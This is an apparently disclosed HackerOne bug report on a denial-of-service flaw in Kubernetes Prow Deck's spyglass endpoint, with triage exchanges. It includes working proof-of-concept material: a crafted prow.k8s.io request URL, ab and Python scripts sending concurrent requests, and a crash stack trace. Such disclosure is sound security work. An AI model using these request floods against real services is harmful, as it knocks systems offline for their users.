{"id":833856,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzM4NTY=","url":"https://hackerone.com/reports/833856","title":"DoS for GCSArtifact.RealAll","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-03-29T12:30:23.076Z","submitted_at":"2020-03-29T12:30:23.076Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"lazydog","url":"/lazydog","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":39386,"url":"https://hackerone.com/kubernetes","handle":"kubernetes","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Kubernetes","twitter_handle":"kubernetesio","website":"https://kubernetes.io/","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-02-04T19:00:04.236Z","bug_reporter_agreed_on_going_public_at":"2021-01-10T05:26:30.647Z","team_member_agreed_on_going_public_at":"2021-02-04T19:00:03.963Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\nI'm not be goot at english,\nif have anything donâ€™t understand, please contact me.\n\nThanks!\n\n## Summary:\nattackers can control artifactName list make google storage client download large object cause denial of service.\n## Component Version:\nkubenetes/test-infra:master(SHA:fea5af139ecdac00e5efa46539bc80bd0f9e951c)\n\n## Steps To Reproduce:\n  1. request this url, we can see the http response is slowly.so i analyze the code process flow.\n```\nhttps://prow.k8s.io/spyglass/lens/buildlog/rerender?req={\"artifacts\":[\"k8s-test-cache.tar.gz\"],\"index\":0,\"src\":\"gcs/kubernetes-jenkins/cache/poc/\"}\n```{F764935}\n  2. in \"/spyglass/lens/\" endpoint handle function, we can control the req.artifacts params make google storage client download a large object in memory. the vuln code flow like this:\n\n```\ntest-infra/prow/cmd/deck/main.go:702  func handleArtifactView() -\u003e\ntest-infra/prow/cmd/deck/main.go:1151 sg.FetchArtifacts(..., request.Artifacts) -\u003e\ntest-infra/prow/spyglass/artifacts.go:119 s.GCSArtifactFetcher.artifact(..., artifactname) -\u003e\netc..(path process, url sign)\ntest-infra/prow/cmd/deck/main.go:1175 lens.Body(artifacts) -\u003e\ntest-infra/prow/spyglass/lenses/buildlog/lens.go:190 logLinesAll(artifact) -\u003e\ntest-infra/prow/spyglass/lenses/buildlog/lens.go:213 artifact.ReadAll() -\u003e\ntest-infra/prow/spyglass/gcsartifact.go:205 ioutil.ReadAll(reader)\n```\n{F764922}\n  3.ensure prow infra is not interrupted, i write the simple code to simulation the vuln code, and use `ab -n 30 -c 30 http://localhost:8090/download` command concurrent request website.\n```\npackage main\n\nimport (\n    \"net/http\"\n    \"fmt\"\n    \"io/ioutil\"\n    \"strings\"\n)\n\nfunc client() (r *http.Response, err error){\n    var res *http.Response\n    var hc = \u0026http.Client{}\n    // req, err := http.NewRequest(\"GET\", \"https://storage.googleapis.com/kubernetes-jenkins/cache/poc/k8s-test-cache.tar.gz\", nil)\n    req, err := http.NewRequest(\"GET\", \"http://localhost/10MB.BIN\", nil)\n    if err != nil {\n        return nil, err\n    }\n\n    res, err = hc.Do(req)\n    if err != nil {\n        return nil, err\n    }\n\n    return res, nil\n}\n\nfunc download(w http.ResponseWriter, req *http.Request) {\n    res, err := client()\n    if err != nil {\n        fmt.Fprintf(w, \"err\")\n    }\n\n    defer res.Body.Close()\n\n    read, err := ioutil.ReadAll(res.Body)\n    if err != nil {\n        fmt.Fprintf(w, \"err\")\n    }\n\n    lines := strings.Split(string(read), \"\\n\")\n    data := strings.Join(lines, \"\")\n    fmt.Fprintf(w, data)\n}\n\nfunc main() {\n    http.HandleFunc(\"/download\", download)\n\n    http.ListenAndServe(\":8090\", nil)\n}\n```\nresult:\n{F764944}\n\n4.i think concurrent request the prow spyglass endpoint  also make server out of memory.\n\n## Impact\n\nattacker can send HTTP request to the prow can cause an a denial of service by control the fetcher download large object.","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":764922,"file_name":"ReadAll.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WEJgvoH5k5ttR8CBdAoqzVvF?response-content-disposition=attachment%3B%20filename%3D%22ReadAll.png%22%3B%20filename%2A%3DUTF-8%27%27ReadAll.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153258Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f3325affaeec6d35609190cbee7949c22517d3a4388a902f010e90ca7f7b2592","file_size":151119,"type":"image/png"},{"id":764935,"file_name":"slowly.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/DcX5ioHfvncsepiVRegi8Ej4?response-content-disposition=attachment%3B%20filename%3D%22slowly.png%22%3B%20filename%2A%3DUTF-8%27%27slowly.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153258Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b0598eb1ed1b284c7aa013a6c14ed6385c3e65240fa0195aaca47ad6dd43865d","file_size":429095,"type":"image/png"},{"id":764944,"file_name":"oom.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VGzdsf82Q78ngWmbAoyygDVX?response-content-disposition=attachment%3B%20filename%3D%22oom.png%22%3B%20filename%2A%3DUTF-8%27%27oom.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153258Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=79ee1065334e76f29211c25cba1bc21e22c15d0bfdd38cf049d60a26792b4356","file_size":358028,"type":"image/png"}],"allow_singular_disclosure_at":"2021-02-09T05:26:30.716Z","allow_singular_disclosure_after":-21117987.90092995,"singular_disclosure_allowed":true,"vote_count":4,"voters":["1337fenrir","0nlymohammed","mattharkonnen","thieff"],"severity":{"rating":"medium","score":4.3,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"low"}},"structured_scope":{"databaseId":32522,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/kubernetes/test-infra","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7481247,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @lazydog - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.","automated_response":false,"created_at":"2020-03-30T13:22:06.728Z","updated_at":"2020-03-30T13:22:06.728Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7486357,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @lazydog - Thanks for the report. Can you please provide a video demonstrating how to reproduce this with your Go script? Also, can you please provide the `10MB.BIN` file you used? ","automated_response":false,"created_at":"2020-03-30T20:25:10.425Z","updated_at":"2020-03-30T20:25:10.425Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7491854,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @tuxedo \ni created reproduce GIF, see F767377 attachment.\nabout `10MB.BIN` file, you can use `dd if=/dev/zero of=10MB.BIN bs=1M count=10` command to generate.\n\n{F767377}","automated_response":false,"created_at":"2020-03-31T11:33:12.761Z","updated_at":"2020-03-31T11:33:12.761Z","actor":{"username":"lazydog","cleared":false,"url":"/lazydog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":767377,"filename":"poctest.gif","type":"image/gif","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kC7prHde6M9GibctRDMeck7s?response-content-disposition=attachment%3B%20filename%3D%22poctest.gif%22%3B%20filename%2A%3DUTF-8%27%27poctest.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153258Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f699913a431293c7939f823d9b1ad8af36e5c1e6dc4964f28a5094d4ac22c830"}],"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7570398,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @lazydog and thanks for your report,\n\nI am a bit confused. You are claiming that the vulnerability is present on `kubenetes/test-infra` Github repository. Then, you are saying that on `https://prow.k8s.io/spyglass/lens/buildlog/rerender?req={\"artifacts\":[\"k8s-test-cache.tar.gz\"],\"index\":0,\"src\":\"gcs/kubernetes-jenkins/cache/poc/\"}` there is \"/spyglass/lens/\" which has some vulnerability on some functions (I guess it has the same context as `kubenetes/test-infra` github repository.\n\nAfter that, as a PoC you provide a Go script which does not touch Kubernetes' infrastructure, and you provided a video where there is not even 1 command belonging to Kubernetes' software.\n\nCan you please clarify better the problem and the steps to reproduce, by elaborating a little bit more the context and the exploit?\n\nBest regards,\n@turtle_shell","automated_response":false,"created_at":"2020-04-07T09:49:56.490Z","updated_at":"2020-04-07T09:49:56.490Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7583659,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi, @turtle_shell \nsorry my bad,  i take a long time to build deck binary, deck is a https://prow.k8s.io website programe.\nnow, i use the repo code reproduced oom vuln.\ncreate a vuln env step is(because build step is to long,i'm not record  this.):\n```\n# clone the test-infra source code\ngit clone https://github.com/kubernetes/test-infra\n# install bazel build tools\n# ref: https://docs.bazel.build/versions/3.0.0/install-ubuntu.html\n# use bazel to build deck\ncd test-infra \u0026\u0026 bazel run //prow/cmd/deck\n# download minikube to build a k8s cluster\n# ref: https://kubernetes.io/docs/tasks/tools/install-minikube/\nminikube start --kubernetes-version=v1.17.3\n# after the cluster is started, run deck binary like this options,  config.yaml in test-infra/config/prow/ directory\nbazel-bin/prow/cmd/deck/linux_amd64_pure_stripped/deck --config-path /tmp/config.yaml -spyglass -gcs-no-auth -kubeconfig ~/.kube/config --template-files-location ./prow/cmd/deck/template/\n# now if you can  see tcp port 8080 is binding localhost,that means deck is successful startup\n```\nreproduce step is:\n1. use `ab` command to request the deck service.\n\n```\nab -n 30 -c 30 \"http://127.0.0.1:8080/spyglass/lens/buildlog/rerender?req={%22artifacts%22:[%22k8s-test-cache.tar.gz%22],%22index%22:0,%22src%22:%22gcs/kubernetes-jenkins/cache/poc/%22}\"\n```\ni created a new gif, when the program is panic, we can see stack include the readall func.\n{F779274}\nstack info:\n```\ngoroutine 420 [sync.Cond.Wait]:\nruntime.goparkunlock(...)\n\tGOROOT/src/runtime/proc.go:310\nsync.runtime_notifyListWait(0xc000d8c540, 0xc000000013)\n\tGOROOT/src/runtime/sema.go:510 +0xf8\nsync.(*Cond).Wait(0xc000d8c530)\n\tGOROOT/src/sync/cond.go:56 +0x9d\nnet/http.(*http2pipe).Read(0xc000d8c528, 0xc0032a6000, 0x3c7e00, 0x3c7e00, 0x0, 0x0, 0x0)\n\tGOROOT/src/net/http/h2_bundle.go:3512 +0xa6\nnet/http.http2transportResponseBody.Read(0xc000d8c500, 0xc0032a6000, 0x3c7e00, 0x3c7e00, 0x0, 0x0, 0x0)\n\tGOROOT/src/net/http/h2_bundle.go:8448 +0xac\ngo.opencensus.io/plugin/ochttp.(*bodyTracker).Read(0xc00057ff40, 0xc0032a6000, 0x3c7e00, 0x3c7e00, 0x8000, 0x0, 0x0)\n\texternal/io_opencensus_go/plugin/ochttp/trace.go:113 +0x55\ngo.opencensus.io/plugin/ochttp.(*tracker).Read(0xc0016ce5b0, 0xc0032a6000, 0x3c7e00, 0x3c7e00, 0x3c7eb0, 0x7, 0x972ccbbb529c7e76)\n\texternal/io_opencensus_go/plugin/ochttp/client_stats.go:126 +0x56\ncloud.google.com/go/storage.(*Reader).readWithRetry(0xc0008e5860, 0xc0032a6000, 0x3c7e00, 0x3c7e00, 0x3cfe00, 0x4c6ccd8, 0x0)\n\texternal/com_google_cloud_go/storage/reader.go:319 +0xb3\ncloud.google.com/go/storage.(*Reader).Read(0xc0008e5860, 0xc0032a6000, 0x3c7e00, 0x3c7e00, 0x8000, 0x0, 0x0)\n\texternal/com_google_cloud_go/storage/reader.go:297 +0x59\nbytes.(*Buffer).ReadFrom(0xc000f05350, 0x2141800, 0xc0008e5860, 0x40906b, 0xc000030000, 0x1aee460)\n\tGOROOT/src/bytes/buffer.go:204 +0xb4\nio/ioutil.readAll(0x2141800, 0xc0008e5860, 0x200, 0x0, 0x0, 0x0, 0x0, 0x0)\n\tGOROOT/src/io/ioutil/ioutil.go:36 +0x100\nio/ioutil.ReadAll(...)\n\tGOROOT/src/io/ioutil/ioutil.go:45\nk8s.io/test-infra/prow/spyglass.(*GCSArtifact).ReadAll(0xc000dc7b30, 0x0, 0x0, 0x0, 0x0, 0x0)\n\tprow/spyglass/gcsartifact.go:205 +0x298\nk8s.io/test-infra/prow/spyglass/lenses/buildlog.logLinesAll(0x21a4cc0, 0xc000dc7b30, 0x50, 0xc0003e5d60, 0x44592c, 0x47e7ab, 0xc000f05520)\n\tprow/spyglass/lenses/buildlog/lens.go:213 +0x3b\nk8s.io/test-infra/prow/spyglass/lenses/buildlog.Lens.Body(0xc000d9c920, 0x1, 0x1, 0xc000e35990, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, ...)\n\tprow/spyglass/lenses/buildlog/lens.go:163 +0x1b2\nmain.handleArtifactView.func1(0x2183380, 0xc000815480, 0xc000ed7d00)\n\tprow/cmd/deck/main.go:1184 +0x9b3\nnet/http.HandlerFunc.ServeHTTP(0xc0003c47e0, 0x2183380, 0xc000815480, 0xc000ed7d00)\n\tGOROOT/src/net/http/server.go:2007 +0x44\nnet/http.StripPrefix.func1(0x2183380, 0xc000815480, 0xc000e5c900)\n\tGOROOT/src/net/http/server.go:2046 +0x18a\nnet/http.HandlerFunc.ServeHTTP(0xc00059c090, 0x2183380, 0xc000815480, 0xc000e5c900)\n\tGOROOT/src/net/http/server.go:2007 +0x44\ngithub.com/NYTimes/gziphandler.NewGzipLevelAndMinSize.func1.1(0x2183380, 0xc000815480, 0xc000e5c900)\n\texternal/com_github_nytimes_gziphandler/gzip.go:255 +0x262\nnet/http.HandlerFunc.ServeHTTP(0xc00059c0c0, 0x2183380, 0xc000815480, 0xc000e5c900)\n\tGOROOT/src/net/http/server.go:2007 +0x44\nnet/http.(*ServeMux).ServeHTTP(0xc0005649c0, 0x2183380, 0xc000815480, 0xc000e5c900)\n\tGOROOT/src/net/http/server.go:2387 +0x1bd\nk8s.io/test-infra/prow/metrics.TraceHandler.func1.1(0x2183700, 0xc0001a4c40, 0xc000e5c900)\n\tprow/metrics/http.go:97 +0x114\nnet/http.HandlerFunc.ServeHTTP(0xc000d6f180, 0x2183700, 0xc0001a4c40, 0xc000e5c900)\n\tGOROOT/src/net/http/server.go:2007 +0x44\nnet/http.serverHandler.ServeHTTP(0xc0001a40e0, 0x2183700, 0xc0001a4c40, 0xc000e5c900)\n\tGOROOT/src/net/http/server.go:2802 +0xa4\nnet/http.(*conn).serve(0xc0006d34a0, 0x218bbc0, 0xc000e74140)\n\tGOROOT/src/net/http/server.go:1890 +0x875\ncreated by net/http.(*Server).Serve\n\tGOROOT/src/net/http/server.go:2927 +0x38e\n```\n\nif `ab` is not enough to reproduce, i think maybe can use  htis poc code written by python:\n```\nfrom multiprocessing.dummy import Pool\nimport requests\n\n\ndef DoReq(url):\n    try:\n        req = requests.get(url)\n    except Exception as e:\n        print(e)\n\n\nif __name__ == \"__main__\":\n    url = \"http://127.0.0.1:8080/spyglass/lens/buildlog/rerender?req={%22artifacts%22:[%22k8s-test-cache.tar.gz%22],%22index%22:0,%22src%22:%22gcs/kubernetes-jenkins/cache/poc/%22}\"\n    p = Pool(30)\n    r = range(30)\n    p.map(lambda x: DoReq(url), r)\n    p.close()\n```\n\n\nBest regards,\n@lazydog \n","automated_response":false,"created_at":"2020-04-08T13:17:14.902Z","updated_at":"2020-04-08T13:17:14.902Z","actor":{"username":"lazydog","cleared":false,"url":"/lazydog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":779274,"filename":"real_poctest.gif","type":"image/gif","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HUfyjBzqz8ntiqzojv7AuVpx?response-content-disposition=attachment%3B%20filename%3D%22real_poctest.gif%22%3B%20filename%2A%3DUTF-8%27%27real_poctest.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153258Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12V